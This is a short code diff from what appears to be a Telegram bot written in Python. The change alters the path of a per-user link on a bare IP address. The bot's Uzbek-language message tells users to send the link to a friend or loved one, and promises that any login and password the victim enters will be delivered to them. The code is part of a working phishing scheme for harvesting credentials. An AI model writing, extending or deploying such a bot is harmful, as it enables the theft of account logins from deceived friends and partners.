@@ -39,7 +39,7 @@ def start(update,context):
 
 def link(update,context):
     text = f"""
-    ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
+    ➡️ *http://13.60.29.35:8000/Nakrutka/3/{update.message.from_user.id}* ⬅️
     \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
     \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
     """
